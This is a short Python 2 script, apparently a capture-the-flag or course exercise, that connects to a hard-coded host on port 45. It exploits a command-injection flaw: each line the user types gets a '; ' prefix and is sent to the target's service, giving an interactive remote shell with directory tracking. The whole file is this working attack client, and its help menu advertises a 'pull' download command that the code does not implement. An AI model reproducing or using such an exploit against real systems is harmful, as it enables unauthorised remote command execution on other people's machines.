import socket

host = "cornerstoneairlines.co" # IP address here
port = 45 # Port here

def execute_cmd(cmd):
    """
        Sockets: https://docs.python.org/2/library/socket.html
        How to use the socket s:
    """
    if "shell" in cmd:
        io = raw_input("/> ")
        cd = ""
        current = "/"
        previous = ""
        
        while ("exit") not in io:
            # Establish socket connection
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))

            if "cd" in io:
                cd = io
                previous = current
                current = io.partition("cd ")[2]
            data = s.recv(1024)
            
            if "/" not in current:
                move = "; "+cd+"; "+io+'\n'
            else:
                move = "; "+io+'\n'
            s.send(move)
            data = s.recv(1024)
            print(data)
            io = raw_input(current +"> ")

        s.close()
        execute_cmd(raw_input("> "))
    elif "help" in cmd:
        print(" 1. shell Drop into an interactive shell and allow users to gracefully exit \n 2. pull <remote-path> <local-path> Download files \n 3. help shows this help menu \n 3. quit Quit the shell \n")
        execute_cmd(raw_input("> "))
    elif "quit" in cmd:
        exit(0)
    else:
        exit(0)


if __name__ == '__main__':
    execute_cmd(raw_input("> "))
